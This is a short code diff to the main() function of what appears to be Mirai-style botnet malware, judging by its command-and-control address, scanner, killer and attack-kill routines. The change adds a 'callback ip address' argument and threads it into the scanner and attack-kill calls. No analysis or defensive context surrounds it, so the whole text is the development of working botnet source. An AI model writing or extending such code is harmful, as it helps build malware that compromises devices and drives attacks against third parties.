@@ -47,12 +47,13 @@ static void segv_handler(int sig, siginfo_t *si, void *unused)
 
 int main(int argc, char **args)
 {
-    if (argc == 3) {
+    if (argc == 4) {
         util_strcpy(cncIpAddress, args[1]);
 #ifdef DEBUG
         printf("[main] number of arguments: %d\n", argc);
         printf("[main] cnc ip address (args[1]): %s\n", args[1]);
         printf("[main] local ip address (args[2]): %s\n", args[2]);
+        printf("[main] callback ip address (args[3]): %s\n", args[3]);
 #endif
     }
 
@@ -170,7 +171,7 @@ int main(int argc, char **args)
 #ifdef DEBUG
     printf("[main] starting scanner\n");
 #endif
-    scanner_init(args[2]);
+    scanner_init(args[2], args[3]);
 #endif
 //#endif
 
@@ -236,7 +237,7 @@ int main(int argc, char **args)
             scanner_kill();
 #endif
             killer_kill();
-            attack_kill_all(args[2]);
+            attack_kill_all(args[2], args[3]);
             kill(pgid * -1, 9);
             exit(0);
         }
